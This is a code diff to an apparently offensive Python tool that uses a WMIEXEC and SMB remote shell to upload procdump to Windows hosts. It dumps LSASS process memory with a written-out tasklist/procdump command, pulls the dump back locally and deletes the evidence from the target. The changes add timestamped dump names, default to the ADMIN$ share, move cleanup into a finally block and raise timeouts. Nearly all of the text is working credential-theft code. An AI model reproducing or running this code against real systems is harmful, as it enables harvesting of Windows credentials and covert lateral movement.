@@ -34,7 +34,9 @@ import time
 import logging
 import ntpath
 
-import os, sys, logging, ntpath, time, shutil
+import os, sys, logging, ntpath, time, shutil, pathlib
+from multiprocessing import Queue
+from datetime import datetime
 from core.Utils import *
 from core.Colors import *
 from core.Paths import *
@@ -55,7 +57,7 @@ OUTPUT_FILENAME = '__' + str(time.time())
 CODEC = sys.stdout.encoding
 
 class WMIEXEC:
-    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None, noOutput=False, doKerberos=False, kdcHost=None):
+    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share='ADMIN$', noOutput=False, doKerberos=False, kdcHost=None):
         self.__command = command
         self.__username = username
         self.__password = password
@@ -104,49 +106,37 @@ class WMIEXEC:
             self.shell = RemoteShell(self.__share, win32Process, smbConnection)
 
             procpath = os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'procdump', 'procdump%s.exe' % (osArch))
-            logging.debug("%sUploading procdump to %s..." % (debugBlue, addr))
+            logging.info("%s  Uploading procdump to %s..." % (debugBlue, addr))
             with suppress_std():
                 self.shell.do_put(procpath)
+            
+            dt = datetime.now().strftime("%m-%d-%Y_%H-%M-%S")
+            cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do procdump{}.exe -accepteula -ma ^%B C:\\{}.dmp""".format(osArch, addr + "_" + dt)
+            logging.info("%s  Executing procdump on %s..." % (debugBlue, addr))
+            #with suppress_std():
+            self.shell.onecmd(cmd)
 
-            cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do procdump{}.exe -accepteula -ma ^%B C:\\{}.dmp""".format(osArch, addr)
-            logging.debug("%sExecuting procdump on %s..." % (debugBlue, addr))
+            logging.info("%s  Retrieving %s's dump locally... (can take a while)." % (debugBlue, addr))
             with suppress_std():
-                self.shell.onecmd(cmd)
-            time.sleep(5)
+                self.shell.do_get("%s.dmp" % (addr + "_" + dt))
 
-            logging.debug("%sRetrieving %s's dump locally..." % (debugBlue, addr))
+        finally:
             with suppress_std():
-                self.shell.do_get("%s.dmp" % (addr))
-                shutil.move(addr + '.dmp', os.path.join(dumpDir, addr + '.dmp'))
-
-            logging.debug("%sDeleting procdump on %s..." % (debugBlue, addr))
+                if pathlib.Path(addr + "_" + dt + '.dmp').exists():
+                    shutil.move(addr + "_" + dt + '.dmp', os.path.join(dumpDir, addr + "_" + dt + '.dmp'))
+            
+            logging.info("%s  Deleting procdump on %s..." % (debugBlue, addr))
             with suppress_std():
                 self.shell.onecmd("del procdump%s.exe" % (osArch))
 
-            logging.debug("%sDeleting dump on %s..." % (debugBlue, addr))
+            logging.info("%s  Deleting dump on %s..." % (debugBlue, addr))
             with suppress_std():
-                self.shell.onecmd("del %s.dmp" % (addr))
-
-            if True:
-                pass
-            elif self.__command != ' ':
-                self.shell.onecmd(self.__command)
-            else:
-                self.shell.cmdloop()
-        except (Exception, KeyboardInterrupt) as e:
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
-                traceback.print_exc()
-            logging.debug("%sErr: %s..." % (warningRed, e))
+                self.shell.onecmd("del %s.dmp" % (addr + "_" + dt))
+        
             if smbConnection is not None:
                 smbConnection.logoff()
             dcom.disconnect()
             sys.stdout.flush()
-            sys.exit(1)
-
-        if smbConnection is not None:
-            smbConnection.logoff()
-        dcom.disconnect()
 
 class RemoteShell(cmd.Cmd):
     def __init__(self, share, win32Process, smbConnection):
@@ -158,13 +148,13 @@ class RemoteShell(cmd.Cmd):
         self.__win32Process = win32Process
         self.__transferClient = smbConnection
         self.__pwd = str('C:\\')
-        self.__noOutput = True
+        self.__noOutput = False
         self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'
 
         # We don't wanna deal with timeouts from now on.
         if self.__transferClient is not None:
-            self.__transferClient.setTimeout(10)
-            #self.do_cd('\\')
+            self.__transferClient.setTimeout(1000000)
+            self.do_cd('\\')
         else:
             self.__noOutput = True
 
